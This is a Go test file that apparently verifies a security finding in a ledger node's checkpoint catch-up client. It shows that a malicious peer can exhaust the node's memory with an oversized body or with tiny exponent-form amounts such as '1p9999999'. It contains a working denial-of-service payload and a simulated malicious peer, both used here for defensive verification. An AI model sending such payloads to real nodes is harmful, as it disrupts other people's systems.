package node

import (
	"sync"

	"fmt"
	"github.com/eval-apply-labs/go-ledger/consensus"
	"github.com/eval-apply-labs/go-ledger/ledger"
	"github.com/eval-apply-labs/go-ledger/signing"
	"io"
	"net/http"
	"net/http/httptest"
	"runtime"
	"strings"
	"testing"
	"time"
)

// C20: the catch-up client decodes a peer's /hdls/checkpoint with no size bound. Two measurements:
// (1) raw size — a 32 MiB body is decoded in full within the 5 s client timeout (production
// bestCheckpoint client); (2) amplification — a ~1 KiB body of exponent-form amounts allocates
// tens of MB, so a LimitReader alone (the proposed fix) does not bound the cost.
func TestVerifyC20CheckpointFetchCost(t *testing.T) {
	heapNow := func() uint64 {
		runtime.GC()
		var ms runtime.MemStats
		runtime.ReadMemStats(&ms)
		return ms.HeapAlloc
	}

	// (1) raw size, through bestCheckpoint's own client settings (5 s timeout) and fetchCheckpoint.
	const big = 32 << 20
	pad := strings.Repeat("A", big)
	var polls int
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		polls++
		w.Header().Set("Content-Type", "application/json")
		io.WriteString(w, `{"Accounts":[{"PublicKey":"x","Description":"`+pad+`"}]}`)
	}))
	defer srv.Close()
	client := &http.Client{Timeout: 5 * time.Second}
	before := heapNow()
	start := time.Now()
	cp, err := fetchCheckpoint(client, srv.URL)
	if err != nil {
		t.Fatalf("fetch: %v", err)
	}
	t.Logf("(1) decoded a %d MiB checkpoint in %v, live heap +%d MiB (field len %d)",
		big>>20, time.Since(start).Round(time.Millisecond), (heapNow()-before)>>20, len(cp.Accounts[0].Description))
	cp = Checkpoint{}

	// (2) amplification: N accounts whose Amount is "1p9999999" (2^9999999, 9 bytes on the wire).
	const n = 40
	var b strings.Builder
	b.WriteString(`{"Accounts":[`)
	for i := 0; i < n; i++ {
		if i > 0 {
			b.WriteString(",")
		}
		fmt.Fprintf(&b, `{"PublicKey":"k%d","Amount":"1p9999999"}`, i)
	}
	b.WriteString(`]}`)
	body := b.String()
	srv2 := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		io.WriteString(w, body)
	}))
	defer srv2.Close()
	before = heapNow()
	start = time.Now()
	cp2, err := fetchCheckpoint(client, srv2.URL)
	if err != nil {
		t.Fatalf("fetch2: %v", err)
	}
	grown := heapNow() - before
	t.Logf("(2) %d-byte body → %d accounts, live heap +%d MiB in %v (≈%d KiB per 9-byte amount); a 1 MiB cap would admit ≈%d such amounts",
		len(body), len(cp2.Accounts), grown>>20, time.Since(start).Round(time.Millisecond), (grown/n)>>10, (1<<20)/len(`{"PublicKey":"k0","Amount":"1p9999999"},`))
	runtime.KeepAlive(cp2)
}

// C20 end-to-end: a running node with NO bootstrap uses its gossip peers as catch-up sources and
// polls them every tick whether or not it is behind. One malicious peer answering /hdls/checkpoint
// with a ~4 KiB body of exponent-form amounts makes the victim allocate ~120 MB per poll.
func TestVerifyC20CatchUpLoopPollsMaliciousPeer(t *testing.T) {
	const n = 100
	var b strings.Builder
	b.WriteString(`{"Accounts":[`)
	for i := 0; i < n; i++ {
		if i > 0 {
			b.WriteString(",")
		}
		fmt.Fprintf(&b, `{"PublicKey":"k%d","Amount":"1p9999999"}`, i)
	}
	b.WriteString(`]}`)
	body := b.String()
	var mu sync.Mutex
	polls := 0
	evil := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/hdls/checkpoint" {
			mu.Lock()
			polls++
			mu.Unlock()
			io.WriteString(w, body)
			return
		}
		w.WriteHeader(http.StatusAccepted) // swallow gossip
	}))
	defer evil.Close()

	v, _ := signing.Generate(signing.Ed25519{}, "testnet")
	vs := consensus.NewValidatorSet([]consensus.Validator{{PublicKey: v.PublicKeyBase64(), Power: 1}})
	nd := New(Config{
		NetworkID: "testnet", Scheme: signing.Ed25519{}, Signer: v, Validators: vs,
		TransactionCost: rat("0.1"), Timeout: 2 * time.Second, MinBlockInterval: 50 * time.Millisecond,
		Genesis: []ledger.Account{{PublicKey: v.PublicKeyBase64(), Amount: rat("1000"), ValidatorNode: v.PublicKeyBase64()}},
	}, NewHTTPTransport([]string{evil.URL})) // the malicious server is just a configured gossip peer
	runtime.GC()
	var base runtime.MemStats
	runtime.ReadMemStats(&base)
	stop := make(chan struct{})
	var peak uint64
	go func() {
		for {
			select {
			case <-stop:
				return
			default:
			}
			var ms runtime.MemStats
			runtime.ReadMemStats(&ms)
			if ms.HeapAlloc > peak {
				peak = ms.HeapAlloc
			}
			time.Sleep(5 * time.Millisecond)
		}
	}()
	nd.Start()
	time.Sleep(7 * time.Second)
	close(stop)
	nd.Stop()
	mu.Lock()
	p := polls
	mu.Unlock()
	t.Logf("victim (healthy, not behind) polled the malicious peer %d times in 7 s; %d-byte reply; peak heap +%d MiB over baseline",
		p, len(body), (peak-base.HeapAlloc)>>20)
}
